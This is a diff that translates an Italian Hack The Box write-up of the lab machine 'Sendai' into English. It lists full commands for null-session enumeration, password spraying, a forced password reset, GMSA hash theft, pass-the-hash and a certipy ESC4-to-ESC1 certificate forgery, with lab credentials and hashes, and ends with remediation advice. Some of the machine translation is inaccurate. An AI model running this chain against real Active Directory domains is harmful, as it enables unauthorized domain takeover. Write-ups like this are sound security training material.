@@ -1,34 +1,34 @@
 ---
-title: Sendai
+title: "Sendai — English"
 date: 2026-01-10 00:00:00 +0100
 categories: [CTF, HTB]
 tags: [active-directory, adcs, esc1, esc4, gmsa, password-reset, smb]
-lang: it-IT
+lang: en
 toc: true
 description: >-
-  Abuso di SMB Guest, password reset, GMSA e ADCS ESC4 verso ESC1
-  per ottenere il controllo del dominio.
+  SMB Guest access, password reset, GMSA, and AD CS ESC4-to-ESC1 abuse
+  to gain control of the domain.
 ---
 
-<nav class="language-switcher" aria-label="Lingua dell’articolo">
-  <span class="is-current" aria-current="page">IT</span>
-  <a href="{{ '/posts/sendai-english/' | relative_url }}" lang="en">EN</a>
+<nav class="language-switcher" aria-label="Article language">
+  <a href="{{ '/posts/sendai/' | relative_url }}" lang="it">IT</a>
+  <span class="is-current" aria-current="page">EN</span>
 </nav>
 
 
 ## 🎯 Executive Summary
 
-**Sendai** è una macchina Windows che espone diverse vulnerabilità tipiche degli ambienti Active Directory mal configurati. L’accesso iniziale si ottiene sfruttando l’account Guest abilitato per enumerare gli utenti e individuare un account configurato con `UserMustChangePassword`, permettendo un takeover. Il movimento laterale sfrutta i permessi sui **GMSA** (Group Managed Service Accounts), mentre l’escalation finale abusa di una misconfigurazione sui template dei certificati (**ESC4**) per rendere il sistema vulnerabile a **ESC1** e impersonare l’Administrator.
+**Sendai** is a Windows machine exposing several vulnerabilities common to misconfigured Active Directory environments. Initial access abuses the enabled Guest account to enumerate users and identify an account with `UserMustChangePassword`, enabling account takeover. Lateral movement relies on permissions over a **GMSA** (Group Managed Service Account), while the final escalation abuses an **ESC4** certificate-template misconfiguration to introduce **ESC1** and impersonate **Administrator**.
 
-| Attributo      | Valore                                                                                                                     |
+| Attribute | Value |
 |:---------------|:---------------------------------------------------------------------------------------------------------------------------|
-| **OS**         | Windows Server 2022                                                                                                        |
-| **Difficulty** | Medium                                                                                                                     |
+| **OS**         | Windows Server 2022
+| **Difficulty** | Medium
 | **MITRE TTPs** | ![](https://img.shields.io/badge/T1098-Account_Manipulation-red) ![](https://img.shields.io/badge/T1649-ADCS_Abuse-orange) |
 
-> Obiettivo
+> Objective
 >
-> Sfruttare la catena SMB Guest → Password Reset → GMSA → ADCS ESC4 per ottenere Domain Admin.
+> Use the chain SMB Guest → Password Reset → GMSA → ADCS ESC4 to get Domain Admin.
 
 ------------------------------------------------------------------------
 
@@ -36,7 +36,7 @@ description: >-
 
 ### Nmap Scan
 
-La scansione iniziale rivela un Domain Controller (sendai.vl) con i servizi standard attivi (DNS, Kerberos, LDAP, SMB, WinRM).
+The initial scan reveals a Domain Controller (sendai.vl) with standard active services (DNS, Kerberos, LDAP, SMB, WinRM).
 
 ```
 sudo nmap -p- -A -v -open -T4 10.129.234.66
@@ -174,25 +174,25 @@ sudo nmap -p- -A -v -open -T4 10.129.234.66
     |   3.1.1:
     |_    Message signing enabled and required
 
-### Rilevamento Host e Configurazione SMB
+### Host and Configuration Detection SMB
 
-Il primo comando è una scansione di base per identificare il target.
+The first command is a basic scan to identify the target.
 
 ```
 nxc smb 10.129.234.66                                    
 SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
-NetExec (nxc) identifica l’host come un Windows Server 2022 (Build 20348) che agisce come Domain Controller (name:DC) per il dominio **sendai.vl**.  
-L’output mostra `Null Auth:True.` Questo è il primo grande indicatore di vulnerabilità: il server potrebbe accettare connessioni senza credenziali valide.  
+NetExec (nxc) identifies the host as a Windows Server 2022 (Build 20348) acting as Domain Controller (name: DC) for domain **sendai.vl**.  
+The output shows `Null Auth:True.` This is the first major vulnerability indicator: the server could accept connections without valid credentials.  
 
 ------------------------------------------------------------------------
 
-**Conferma “Null Session” (Accesso Ospite)** Qui verifichiamo esplicitamente se l’autenticazione nulla (o anonima) è permessa.
+**Confirmation “Null Session” (Accesso Ospite)** Here we explicitly check if nothing (or anonymous) authentication is allowed.
 
-**Sintassi:** `-u '%'` indica un utente vuoto/nullo e `-p ''` indica una password vuota.
+**Syntax:** `-u '%'` indicates an empty/null user and `-p ''` indicates an empty password.
 
-L’attacco ha avuto successo! Il server ha mappato la richiesta anonima all’account Guest. Abbiamo un piede dentro il sistema a livello di rete.
+The attack was successful! The server mapped the anonymous request to the Guest account. We have a foot in the network-level system.
 
 ```
 nxc smb 10.129.234.66 -u '%' -p ''
@@ -202,14 +202,14 @@ SMB         10.129.234.66   445    DC               [+] sendai.vl\%: (Guest)
 
 ------------------------------------------------------------------------
 
-**Enumerazione delle Condivisioni (Shares)**
+**Enumeration of Sharing (Shares)**
 
-Ora che abbiamo un accesso valido (come Guest), elenchi le cartelle condivise disponibili; vengono elencate diverse share, ma la colonna Permissions è fondamentale.  
-Abbiamo accesso in lettura (READ) a tre share:
+Now that we have valid access (such as Guest), lists the shared folders available; several share is listed, but the Permissions column is fundamental.  
+We have read access (READ) to three share:
 
-`IPC$:` Standard per le sessioni nulle, serve per enumerare utenti/gruppi (RID Cycling).  
-`Users:` Molto critico. Solitamente contiene le home directory degli utenti.  
-`sendai:` Share non standard (creata dall’amministratore), probabilmente contiene dati aziendali sensibili.  
+`IPC$:` Standard for null sessions, it serves to enumerate users/groups (RID Cycling).  
+`Users:` Very critical. It usually contains user home directories.  
+`sendai:` Non-standard share (created by the administrator), probably contains sensitive business data.  
 
 ```
 nxc smb 10.129.234.66 -u '%' -p '' --shares
@@ -230,11 +230,11 @@ SMB         10.129.234.66   445    DC               Users           READ
 
 ------------------------------------------------------------------------
 
-Esplorazione Manuale con `smbclient`.
+Manual exploration with `smbclient`.
 
-Ci connettiamo manualmente alla share `Users` per vedere cosa c’è dentro.  
-**Sintassi:** `-N` sta per “No password”.  
-**Risultato:** Riusciamo a listare il contenuto (`ls`), confermando l’accesso in lettura e vedendo cartelle come Default e Public.
+We connect manually to share `Users` to see what is inside.  
+**Syntax:** `-N` is for “No password”.  
+**Results:** We can list content (`ls`), confirming read access and seeing folders like Default and Public.
 
 ```
 smbclient //10.129.234.66/Users -N
@@ -249,16 +249,16 @@ smb: \> ls
 
 ------------------------------------------------------------------------
 
-**Spidering Automatico** (Ricerca File)
+**Spidering Automatic** (Research File)
 
-Invece di cercare manualmente in ogni cartella, usiamo NetExec con il modulo `spider_plus` per indicizzare tutto il contenuto delle share leggibili.
+Instead of manually searching in each folder, we use NetExec with the module `spider_plus` to index all content of legible share.
 
-**Azione:** Lo script scansiona ricorsivamente IPC\$, sendai e Users.
+**Action:** The script scans IPC\$, sendai and Users once again.
 
-**Risultato:** Salva un report JSON contenente la lista di tutti i file trovati.
+**Results:** Save a JSON report containing the list of all found files.
 
-***Nota:***  
-**Analisi del JSON:** `(jq .)` L’output finale mostra che dentro la share personalizzata sendai è stato trovato un file chiamato `incident.txt`. Questo è probabilmente un file ***“loot”*** che contiene indizi o password per proseguire l’attacco.
+***Note:***  
+**Analysis of JSON:** `(jq .)` The final output shows that inside the personalized share sendai was found a file called `incident.txt`. This is likely a file ***“loot”*** that contains clues or passwords to continue the attack.
 
 ```
 nxc smb 10.129.234.66 -u '%' -p '' -M spider_plus
@@ -306,26 +306,26 @@ cat '/home/kali/.nxc/modules/nxc_spider_plus/10.129.234.66.json' | jq .
 
 ![100%](/assets/img/posts/sendai/incident.png)
 
-In questa fase abbiamo identificato che il Domain Controller **DC.sendai.vl** permette le `Null Session`. Sfruttando questo accesso, abbiamo enumerato le share di rete scoprendo che le cartelle `Users` e `sendai` sono accessibili in lettura da chiunque. Tramite lo spidering, abbiamo individuato un file interessante (`incident.txt`) nella share sendai che merita un’ispezione immediata.
+At this stage we have identified that Domain Controller **DC.sendai.vl** allows `Null Session`. Taking advantage of this access, we enumerated network share by finding that folders `Users` and `sendai` are accessible by anyone. Through the spidering, we have identified an interesting file (`incident.txt`) share sendai which deserves immediate inspection.
 
 ------------------------------------------------------------------------
 
 ### User Enumeration (RID Cycling)
 
-Avendo confermato l’accesso tramite Null Session (o Guest), possiamo interrogare il Domain Controller per elencare gli utenti del dominio. Poiché non abbiamo i permessi per fare un dump LDAP completo, utilizziamo la tecnica del `RID Cycling` (RID Brute Force).
+Having confirmed access via Null Session (or Guest), we can question Domain Controller to list domain users. Since we do not have permission to make a complete LDAP dump, we use the technique of `RID Cycling` (RID Brute Force).
 
-Questa tecnica interroga il Local Security Authority (LSA) cercando di mappare i RID (Relative ID) ai nomi utente.
+This technique interrogates the Local Security Authority (LSA) trying to map RIDs (Relative IDs) to user names.
 
 ```
-# Esecuzione del RID Brute Force e pulizia dell'output per creare una wordlist
+# Run RID brute force and clean the output to create a wordlist
 netexec smb dc.sendai.vl -u nothing -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
 ```
 
-Il comando genera una lista pulita di utenti validi salvata in users.txt, che include account di servizio (sqlsvc, websvc) e utenti standard (Thomas.Powell, Elliot.Yates).
+The command generates a clean list of valid users saved in users.txt, which includes service accounts (sqlsvc, websvc) and standard users (Thomas.Powell, Elliot.Yates).
 
 **Password Spraying & Account Status Analysis**
 
-Con la lista degli utenti validi, eseguiamo un controllo mirato. Tentiamo di autenticarci su ogni account utilizzando una password vuota (`-p ''`). Questo test serve a identificare account con password non impostate o configurazioni errate.
+With the list of valid users, we perform targeted control. We try to authenticate on each account using an empty password (`-p ''`). This test is used to identify accounts with unset passwords or incorrect configurations.
 
 ```
 nxc smb DC.sendai.vl -u users.txt -p '' --continue-on-success
@@ -360,25 +360,25 @@ SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell:
 SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE
 ```
 
-**Analisi dei Risultati:** L’output rivela informazioni critiche sullo stato degli account:
+**Results analysis:** The output reveals critical information about the status of accounts:
 
-`STATUS_LOGON_FAILURE:` La maggior parte degli account è protetta da password (es. Administrator, sqlsvc).  
-`[+] Guest:` Conferma che l’account Guest è attivo e accessibile senza password.  
-`STATUS_PASSWORD_MUST_CHANGE:` Questo è il risultato più importante. Gli utenti Elliot.Yates e Thomas.Powell restituiscono questo stato.
+`STATUS_LOGON_FAILURE:` Most accounts are password protected (e.g. Administrator, sqlsvc).  
+`[+] Guest:` Confirm that the Guest account is active and accessible without password.  
+`STATUS_PASSWORD_MUST_CHANGE:` This is the most important result. Users Elliot.Yates and Thomas.Powell They return this state.
 
-> Lo stato `STATUS_PASSWORD_MUST_CHANGE` indica che questi account hanno una password configurata (spesso vuota o temporanea) che è scaduta o richiede un cambio immediato al prossimo accesso.
+> The state `STATUS_PASSWORD_MUST_CHANGE` indicates that these accounts have a configured password (often empty or temporary) that has expired or requires immediate change to the next access.
 >
-> Il protocollo SMB permette di effettuare questo cambio password da remoto senza conoscere la vecchia password (se è vuota) o fornendola se nota. Questo è il nostro vettore di attacco per ottenere un account valido.
+> The Protocol SMB allows you to make this password change remotely without knowing the old password (if it is empty) or providing it if you notice. This is our attack carrier to get a valid account.
 
 ------------------------------------------------------------------------
 
 ### Exploitation: Force Password Change
 
-Avendo identificato che l’utente Thomas.Powell ha il flag **STATUS_PASSWORD_MUST_CHANGE**, utilizziamo il modulo `change-password` di NetExec per impostare una nuova password e prendere il controllo dell’account.
+Having identified that user Thomas.Powell has the flag **STATUS_PASSWORD_MUST_CHANGE**, we use the form `change-password` of NetExec to set up a new password and take account control.
 
-***Tentativo 1:*** `Fallimento per Policy`
+***Attempt 1:*** `Policy failure`
 
-Inizialmente, proviamo a impostare una password semplice (“nothing”).
+Initially, we try to set a simple password (“nothing”).
 
 ```
 nxc smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS=nothing
@@ -387,13 +387,13 @@ SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell:
 CHANGE-P... 10.129.234.66   445    DC               [-] SMB-SAMR password change failed: SAMR SessionError: code: 0xc000006c - STATUS_PASSWORD_RESTRICTION - When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria.
 ```
 
-Il tentativo fallisce con l’errore `STATUS_PASSWORD_RESTRICTION (Code: 0xc000006c)`.
+The attempt fails with the error `STATUS_PASSWORD_RESTRICTION (Code: 0xc000006c)`.
 
-> `Password Policy Violation` Questo errore non indica permessi insufficienti, ma che la password scelta non rispetta i criteri di sicurezza del dominio (lunghezza minima, complessità, history, ecc.).
+> `Password Policy Violation` This error does not indicate insufficient permissions, but that the password chosen does not respect the security criteria of the domain (minimum length, complexity, history, etc.).
 
-***Tentativo 2:*** `Successo`
+***Attempt 2:*** `Success`
 
-Riprovare con una password più complessa che includa lettere, numeri e caratteri speciali (“nothing123!”).
+Try again with a more complex password that includes letters, numbers and special characters (“nothing123!”).
 
 ```
 nxc smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS=nothing123!
@@ -402,11 +402,11 @@ SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell:
 CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for Thomas.Powell
 ```
 
-**Risultato:** `[+] Successfully changed password for Thomas.Powell`. L’operazione ha avuto successo. Ora possediamo credenziali valide per il dominio.
+**Results:** `[+] Successfully changed password for Thomas.Powell`. The operation was successful. Now we have valid credentials for the domain.
 
 **Veification & Policy Enumeration**
 
-Per confermare l’accesso e capire perché il primo tentativo è fallito (utile per futuri movimenti laterali), ci autentichiamo con la nuova password e scarichiamo la policy delle password del dominio.
+To confirm access and understand why the first attempt has failed (useful for future lateral movements), we authenticate with the new password and discard the domain password policy.
 
 ```
 nxc smb DC.sendai.vl -u Thomas.Powell -p 'nothing123!' --pass-pol
@@ -432,24 +432,24 @@ SMB         10.129.234.66   445    DC               Account Lockout Threshold: N
 SMB         10.129.234.66   445    DC               Forced Log off Time: Not Set
 ```
 
-**Analisi della Policy:** L’output conferma l’accesso (`[+]`) e ci fornisce le regole del gioco:
+**Policy analysis:** The output confirms access (`[+]`) and gives us the rules of the game:
 
-`Minimum password length: 7:` La lunghezza del primo tentativo (“nothing”, 7 caratteri) era sufficiente. `Password Complexity Flags: 1:` La complessità è abilitata. Questo spiega il fallimento del primo tentativo (mancanza di numeri/simboli).  
-`Account Lockout Threshold: None:` Dato critico. Non esiste un blocco account per troppi tentativi falliti. Questo ci autorizza a effettuare Brute Force aggressivi su altri utenti in futuro se necessario.
+`Minimum password length: 7:` The length of the first attempt (“nothing”, 7 characters) was sufficient. `Password Complexity Flags: 1:` The complexity is enabled. This explains the failure of the first attempt (no numbers/symbols).  
+`Account Lockout Threshold: None:` Critical. There is no account block for too many failed attempts. This allows us to perform aggressive Brute Force on other users in the future if necessary.
 
 ------------------------------------------------------------------------
 
 ### BloodHound Enumeration
 
-Con le credenziali valide di `Thomas.Powell`, raccogliamo i dati del dominio per identificare percorsi di attacco.
+With valid credentials `Thomas.Powell`, we collect domain data to identify attack paths.
 
 ```
 bloodhound-ce-python -c All -d sendai.vl -u 'Thomas.Powell' -p 'nothing123!' -dc dc.sendai.vl -ns 10.129.234.66 --zip
 ```
 
-Dall’analisi del grafo, emerge un percorso interessante che coinvolge i GMSA (Group Managed Service Accounts):
+From the graph analysis, an interesting path involving the GMSA (Group Managed Service Accounts):
 
-`Thomas.Powell` è membro del gruppo Support. Il gruppo `Support` ha permessi `GenericAll` sul gruppo `AdmSvc`. Il gruppo `AdmSvc` ha il privilegio `ReadGMSAPassword` sull’utente `mgtsvc$`. `mgtsvc$` è membro di `Remote Management Users`, quindi può accedere via **WinRM**.
+`Thomas.Powell` is a member of the Support group. The group `Support` has allowed `GenericAll` on the group `AdmSvc`. The group `AdmSvc` has the privilege `ReadGMSAPassword` on the user `mgtsvc$`. `mgtsvc$` is a member of `Remote Management Users`, so it can access via **WinRM**.
 
 ![100%](/assets/img/posts/sendai/bloodhound.png)
 
@@ -457,11 +457,11 @@ Dall’analisi del grafo, emerge un percorso interessante che coinvolge i GMSA (
 
 ### Lateral Movement: GMSA Abuse
 
-L’obiettivo è leggere la password dell’account di servizio gestito (mgtsvc\$). Per farlo, dobbiamo prima elevarci entrando nel gruppo AdmSvc.
+The goal is to read the password of the managed service account (mgtsvc\$). To do so, we must first rise by entering the group AdmSvc.
 
-1.  **Abuso ACL (AddMember)**
+1.  **Abuse ACL (AddMember)**
 
-Poiché il nostro utente (via gruppo Support) ha GenericAll su AdmSvc, possiamo aggiungere noi stessi a quel gruppo usando bloodyAD.
+Since our user (via Support group) has GenericAll up AdmSvc, we can add ourselves to that group using bloodyAD.
 
 ```
 bloodyAD --host DC.sendai.vl -d sendai.vl -u 'Thomas.Powell' -p 'nothing123!' add groupMember 'AdmSvc' 'Thomas.Powell'
@@ -469,9 +469,9 @@ bloodyAD --host DC.sendai.vl -d sendai.vl -u 'Thomas.Powell' -p 'nothing123!' ad
 Output: [+] Thomas.Powell added to AdmSvc
 ```
 
-2.  **Recupero Password GMSA**
+2.  **Password Recovery GMSA**
 
-Ora che siamo membri di `AdmSvc`, abbiamo i diritti per leggere l’attributo `msDS-ManagedPassword` dell’account **mgtsvc\$**. Usiamo NetExec per estrarre direttamente l’hash NTLM.
+Now that we are members of `AdmSvc`, we can read the `msDS-ManagedPassword` attribute of the **mgtsvc$** account. We use NetExec to extract its NTLM hash directly.
 
 ```
 netexec ldap DC.sendai.vl -u 'Thomas.Powell' -p 'nothing123!' --gmsa
@@ -482,11 +482,11 @@ LDAP ... [*] Getting GMSA Passwords
 LDAP ... Account: mgtsvc$  NTLM: 2579ff83767013c18bbec6e84ffea6f9
 ```
 
-> **Cos'è un GMSA?** I `Group Managed Service Accounts` sono account di dominio gestiti automaticamente da AD (*la password cambia da sola ed è molto complessa*). Tuttavia, se un attaccante ottiene i permessi per leggerla, può impersonare l'account indefinitamente finché la password non ruota (solitamente ogni 30 giorni).
+> **What is a GMSA?** I `Group Managed Service Accounts` are domain accounts managed automatically by AD (*the password changes by itself and is very complex*). However, if an attacker gets permission to read it, he can indefinitely impersonate the account until the password rotates (usually every 30 days).
 
-3.  **Accesso WinRM & User Flag** 🚩
+3.  **Access WinRM & User Flag** 🚩
 
-Con l’hash NTLM recuperato, possiamo autenticarci via Pass-The-Hash e ottenere la flag utente.
+With the recovered NTLM hash, we can authenticate via Pass-The-Hash and get the user flag.
 
 ```
 evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H '2579ff83767013c18bbec6e84ffea6f9'
@@ -496,29 +496,29 @@ PowerShell
 *Evil-WinRM* PS C:\Users\mgtsvc$\Documents> type ..\Desktop\user.txt
 ```
 
-## Accesso e Enumerazione Iniziale
+## Initial Access and Enumeration
 
-Una volta dentro, ho eseguito i controlli di routine:
+Once inside, I ran routine checks:
 
-`whoami /priv:` Mostra i privilegi attivi. Sebbene `SeMachineAccountPrivilege` sia abilitato, non ci sono i classici privilegi da “admin immediato” (come `SeImpersonate` o `SeDebug`).
+`whoami /priv:` Show active privileges. Although `SeMachineAccountPrivilege` be enabled, there are no classic privileges from “immediate admin” (as `SeImpersonate` or `SeDebug`).
 
-`whoami /all:` Rivela che l’utente appartiene al gruppo Domain Computers.
+`whoami /all:` Reveal that the user belongs to the Domain Computers group.
 
-**Enumerazione Automatizzata con PrivescCheck**
+**Automated enumeration with PrivescCheck**
 
-Per velocizzare la ricerca di misconfigurazioni, ho caricato in memoria lo script PowerShell `PrivescCheck` (***Import-Module .\PrivescCheck.ps1***) e lo ho eseguito con `Invoke-PrivescCheck`.
+To speed up the search for misconfigurations, I uploaded the script in memory PowerShell `PrivescCheck` (***Import-Module .\PrivescCheck.ps1***) and I ran it with `Invoke-PrivescCheck`.
 
-Questo tool analizza vari aspetti del sistema, tra cui:
+This tool analyses various aspects of the system, including:
 
-- Identità utente e gruppi (che confermano il livello di integrità Medium).
-- Privilegi (nessuno sfruttabile direttamente).
-- Servizi non di default: Qui avviene la scoperta critica.
+- User identity and groups (which confirm the Medium integrity level).
+- Privilegi (no exploitable directly).
+- Non-default services: Here is the critical discovery.
 
-**Cleartext Credentials nei Servizi**
+**Cleartext Credentials in Services**
 
-L’output dello script nella sezione “Service list (non-default)” evidenzia un servizio anomalo chiamato Support.
+The output of the script in the “Service list” section highlights an abnormal service called Support.
 
-Analizzando la configurazione del servizio, notiamo una gravissima vulnerabilità di sicurezza:
+Analyzing the configuration of the service, we notice a very serious security vulnerability:
 
 ```
 *Evil-WinRM* PS C:\Users\mgtsvc$\documents> .\PrivescCheck.ps1                                                               
@@ -600,28 +600,28 @@ StartMode   : Automatic
  
 ```
 
-L’eseguibile del servizio viene lanciato con dei parametri che includono credenziali in chiaro (username e password) passate direttamente nella riga di comando.
+The service executable is launched with parameters that include clear credentials (username and password) passed directly into the command line.
 
 ------------------------------------------------------------------------
 
-### Weaponization: Abuso di ESC4
+### Weaponization: Abuse of ESC4
 
-Dopo aver scoperto che l’utente `clifford.davey` (o il gruppo `Authenticated Users`) ha permessi di scrittura sul template **SendaiComputer** (Vulnerabilità **ESC4**), utilizziamo `certipy` per modificare la configurazione del template stesso.
+After finding out that the user `clifford.davey` (or group `Authenticated Users`) has writing permissions on the template **SendaiComputer** (Vulnerability) **ESC4**), we use `certipy` to change the template configuration itself.
 
 ```
 certipy template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration -no-save
  
 ```
 
-**Cosa succede qui?** Stiamo abusando dei permessi di scrittura per riconfigurare il template e renderlo vulnerabile a **ESC1**. Il comando imposta specifici flag:
+**What's going on here?** We are abusing writing permissions to reconfigure the template and make it vulnerable to **ESC1**. The command sets specific flags:
 
-- `Enrollee Supplies Subject`: **True** (Ci permette di specificare noi chi vogliamo impersonare nel certificato).
-- `Client Authentication`: **True** (Il certificato può essere usato per il login).
-- `Authorized Signatures`: **0** (Nessuna approvazione manuale richiesta).
+- `Enrollee Supplies Subject`: **True.** (It allows us to specify who we want to impersonate in the certificate).
+- `Client Authentication`: **True.** (The certificate can be used for login).
+- `Authorized Signatures`: **0** (No manual approval required).
 
-### Verifica della Vulnerabilità (ESC1)
+### Verification of Vulnerability (ESC1)
 
-Eseguiamo nuovamente una scansione per confermare che le modifiche siano state applicate correttamente.
+We perform a scan again to confirm that the changes have been applied correctly.
 
 ```
 certipy find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -stdout
@@ -703,14 +703,14 @@ Certificate Templates
  
 ```
 
-**Analisi Output:** Sotto `[!] Vulnerabilities`, ora vediamo chiaramente:
+**Output analysis:** Under `[!] Vulnerabilities`, now we see clearly:
 
-- **ESC1**: *“Enrollee supplies subject and template allows client authentication.”*
-- Questo conferma che abbiamo trasformato un template innocuo in uno strumento per creare amministratori.
+- **ESC1**: *“Enrolle supplies subject and template allows authentication clients. ”*
+- This confirms that we have turned a harmless template into a tool to create administrators.
 
-### Exploitation: Forgiatura del Certificato
+### Exploitation: Certificate Forging
 
-Ora richiediamo un certificato alla CA utilizzando il template manipolato. Il trucco sta nel parametro `-upn` (User Principal Name).
+Now we request a CA certificate using the manipulated template. The trick lies in the parameter `-upn` (User Principal Name).
 
 ```
 certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
@@ -734,13 +734,13 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
  
 ```
 
-> Nota Tecnica
+> Technical Note
 >
-> Il primo tentativo fallisce per timeout NetBIOS, ma il secondo va a buon fine (`Successfully requested certificate`). Stiamo dicendo alla CA: *“Ciao, sono clifford.davey, ho il permesso di usare questo template. Per favore emetti un certificato valido per **Administrator**.”* Grazie alla modifica precedente, la CA si fida e ci consegna `administrator.pfx`.
+> The first attempt fails for NetBIOS timeout, but the second one goes well (`Successfully requested certificate`). We're telling the CA: *“Hello, I am clifford.davey, I have permission to use this template. Please issue a valid certificate **Administrator**.”* Thanks to the previous change, CA trusts and delivers `administrator.pfx`.
 
 ### Authentication & Domain Dominance
 
-Abbiamo un certificato digitale valido per l’amministratore, ma per accedere via WinRM ci serve un hash NTLM o una password. Usiamo `certipy auth` per autenticarci tramite Kerberos (PKINIT) usando il certificato.
+We have a digital certificate valid for the administrator, but to access via WinRM We need a NTLM hash or password. We use `certipy auth` to authenticate us via Kerberos (PKINIT) using the certificate.
 
 ```
 certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66
@@ -760,11 +760,11 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
  
 ```
 
-**Risultato:** Il Domain Controller convalida il certificato e ci restituisce l’hash NTLM dell’Administrator: `aad3...:cfb106feec8b89a3d98e14dcbe8d087a`
+**Result:** The Domain Controller validates the certificate and returns the Administrator NTLM hash: `aad3...:cfb106feec8b89a3d98e14dcbe8d087a`
 
 ### Pwned! 🚩
 
-Infine, eseguiamo un classico **Pass-The-Hash** con `evil-winrm` per ottenere una shell come Domain Admin e leggere la flag `root.txt`.
+Finally, we perform a classic **The-Hash** with `evil-winrm` to get a shell like Domain Admin and read the flag `root.txt`.
 
 ```
 evil-winrm-py -i DC.sendai.vl -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a
@@ -774,34 +774,34 @@ evil-winrm-py -i DC.sendai.vl -u administrator -H cfb106feec8b89a3d98e14dcbe8d08
 
 ## 🛡️ Remediation & Defense
 
-La compromissione di **Sendai** evidenzia come una catena di misconfigurazioni, partendo da un accesso Guest fino ai servizi di certificato, possa portare alla compromissione totale del dominio.
+The compromise **Sendai** highlights how a chain of misconfigurations, starting from a Guest access to certificate services, can lead to the total compromise of the domain.
 
-> Vulnerabilità Critica: ADCS Misconfiguration (ESC4 ➔ ESC1)
+> Critical Vulnerability: ADCS Misconfiguration (ESC4 ➔ ESC1)
 >
-> L’escalation a Domain Admin è stata resa possibile dai permessi eccessivi sul Template di Certificato `SendaiComputer`.
+> Escalation a Domain Admin was made possible by excessive permissions on the Certificate Template `SendaiComputer`.
 >
-> **Fix Immediato:** Rimuovere i permessi di scrittura (**WriteOwner**, **WriteDacl**, **FullControl**) per gli utenti non privilegiati (come `Authenticated Users` o `clifford.davey`) sui template di certificato.
+> **Fix Immediate:** Remove writing permissions (**WriteOwner**, **WriteDacl**, **FullControl**) for unprivileged users (as `Authenticated Users` or `clifford.davey`) on certificate templates.
 >
-> **Hardening:** Assicurarsi che il flag `ENROLLEE_SUPPLIES_SUBJECT` non sia mai abilitato su template che permettono l’autenticazione client, a meno che non sia strettamente necessario e protetto da “Manager Approval”.
+> **Hardening:** Make sure the flag `ENROLLEE_SUPPLIES_SUBJECT` is never enabled on templates that allow client authentication, unless it is strictly necessary and protected by “Manager Approval”.
 
-### 🔒 Hardening Active Directory & Servizi
+### 🔒 Hardening Active Directory & Services
 
-1.  **Disabilitare Accesso Guest/Null Session:**
+1.  **Disable Guest/Null Session Access:**
 
-    - L’attacco è iniziato perché il Domain Controller permetteva l’enumerazione anonima SMB.
-    - **Azione:** Impostare la chiave di registro `RestrictAnonymous` a `1` o `2` e disabilitare l’account Guest via GPO. Impedire l’enumerazione delle share agli utenti non autenticati.
+    - The attack started because the Domain Controller allowed anonymous enumeration SMB.
+    - **Action:** Set the registry key `RestrictAnonymous` a `1` or `2` and disable the Guest account via GPO. Prevent share enumeration for unauthorized users.
 
-2.  **Gestione Credenziali nei Servizi:**
+2.  **Management of Credentials in Services:**
 
-    - È stato individuato il servizio `Support` che eseguiva un binario con credenziali in chiaro (`-u clifford.davey -p ...`) passate come argomenti.
-    - **Azione:** Non passare mai credenziali come argomenti della riga di comando (facilmente leggibili via WMI/API). Utilizzare **Group Managed Service Accounts (gMSA)** o account di servizio virtuali.
+    - The service has been identified `Support` running a track with clear credentials (`-u clifford.davey -p ...`) passed as arguments.
+    - **Action:** Never pass credentials as command line arguments (easy readable via WMI/API). Use **Group Managed Service Accounts (gMSA)** or virtual service accounts.
 
-3.  **Password Policy & Monitoraggio:**
+3.  **Password Policy & Monitoring:**
 
-    - L’account `Thomas.Powell` era esposto con lo stato `PasswordMustChange` accessibile via SMB null-session.
-    - **Azione:** Monitorare gli account con password scadute o “Must Change” e impedire che il cambio password venga effettuato tramite protocolli legacy o sessioni non pienamente autenticate.
+    - The account `Thomas.Powell` was exposed with the state `PasswordMustChange` accessible SMB null-session.
+    - **Action:** Monitor accounts with expired passwords or “Must Change” and prevent password change from being made through legacy protocols or unfulfilled sessions.
 
-4.  **Principio del Privilegio Minimo (ACL):**
+4.  **Principle of Minimum Privilege (ACL):**
 
-    - Il gruppo `Support` aveva controllo totale (`GenericAll`) sul gruppo `AdmSvc`, permettendo il recupero della password del GMSA `mgtsvc$`.
-    - **Azione:** Eseguire audit periodici delle ACL con strumenti come **BloodHound** o **PingCastle** per identificare e spezzare le catene di attacco (Attack Paths) pericolose tra gruppi di supporto e account di servizio.
+    - The group `Support` had total control (`GenericAll`) on the group `AdmSvc`, allowing recovery of passwords GMSA `mgtsvc$`.
+    - **Action:** Perform periodic audits of ACLs with tools such as **BloodHound** or **PingCastle** to identify and break dangerous attack chains (Attack Paths) between support groups and service accounts.
